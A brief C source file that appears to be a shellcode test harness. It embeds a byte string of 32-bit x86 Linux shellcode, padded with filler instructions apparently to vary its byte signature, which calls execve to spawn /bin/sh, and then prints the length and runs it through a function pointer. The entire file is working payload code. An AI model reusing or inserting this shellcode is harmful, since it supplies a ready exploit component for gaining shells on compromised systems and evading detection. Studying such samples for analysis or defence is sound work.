#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x9e\x31\xc0\x60\x50\xfc\xbe\x2e\x2f\x73\x68\x46\x99\xbf\x2e\x62\x69\x6e\x47\x56\xfd\x57\x89\xe3\xfc\xf5\xb0\x0b\xcd\x80";

main()
{

  printf("Shellcode Length:  %d\n", strlen(code));

        int (*ret)() = (int(*)())code;

        ret();

}
